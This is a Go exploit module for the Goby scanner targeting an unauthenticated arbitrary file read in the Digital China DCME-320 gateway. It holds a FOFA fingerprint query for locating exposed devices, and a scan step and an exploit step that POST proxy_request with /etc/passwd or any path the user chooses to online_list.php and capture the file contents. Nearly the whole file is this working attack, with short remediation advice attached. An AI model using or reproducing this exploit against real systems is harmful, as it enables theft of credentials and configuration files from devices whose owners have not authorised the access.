package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "DCME-320 /online_list.php File Read Vulnerability",
    "Description": "<p>DCME-320 multi-core gateway has an arbitrary file read vulnerability. Attackers can exploit the online_list.php interface to read important files in the system (e.g., database configuration files, system configuration files) without authentication. This vulnerability may lead to sensitive information disclosure and further exploitation for more severe attacks.</p>",
    "Product": "DigitalChina-Camera",
    "Homepage": "http://www.digitalchina.com/",
    "DisclosureDate": "2001-09-20",
    "PostTime": "2024-12-18",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"style/blue/css/dcn_ui.css\" && body=\"UILanguage\"",
    "GobyQuery": "body=\"style/blue/css/dcn_ui.css\" && body=\"UILanguage\"",
    "Level": "1",
    "Impact": "<p>The online_list.php arbitrary file read vulnerability of Digital China DCME-320 export gateway can be exploited by unauthenticated attackers to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.</p>",
    "Recommendation": "<p>1. Close the Internet exposure or set the access rights of the interface</p><p>2. Upgrade to a secure version or apply a patch: <a href=\"http://www.digitalchina.com/\">http://www.digitalchina.com/</a></p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144524170?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "/etc/passwd",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/function/auth/user/online_list.php",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "proxy_request=/etc/passwd"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/function/auth/user/online_list.php",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": "proxy_request={{{filePath}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "神州数码 DCME-320 /online_list.php 文件读取漏洞",
            "Product": "神州数码-摄像头",
            "Description": "<p>神州数码 DCME-320多核出口网关存在任意文件读取漏洞，攻击者无需身份验证即可通过访问online_list.php接口读取系统中的重要文件（如数据库配置文件、系统配置文件等）。此漏洞可能导致敏感信息泄露，进一步被利用进行更严重的攻击。</p>",
            "Recommendation": "<p>1.关闭互联网暴露面或接口设置访问权限</p><p>2.升级至安全版本或打补丁:<a href=\"http://www.digitalchina.com/\">http://www.digitalchina.com/</a><br></p>",
            "Impact": "<p>神州数码 DCME-320出口网关 online_list.php 任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "DCME-320 /online_list.php File Read Vulnerability",
            "Product": "DigitalChina-Camera",
            "Description": "<p>DCME-320 multi-core gateway has an arbitrary file read vulnerability. Attackers can exploit the online_list.php interface to read important files in the system (e.g., database configuration files, system configuration files) without authentication. This vulnerability may lead to sensitive information disclosure and further exploitation for more severe attacks.</p>",
            "Recommendation": "<p>1. Close the Internet exposure or set the access rights of the interface</p><p>2. Upgrade to a secure version or apply a patch: <a href=\"http://www.digitalchina.com/\">http://www.digitalchina.com/</a><br></p>",
            "Impact": "<p>The online_list.php arbitrary file read vulnerability of Digital China DCME-320 export gateway can be exploited by unauthenticated attackers to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be extremely unsafe.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "filePath"
    ],
    "EditType": "fast",
    "PocId": "9978"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
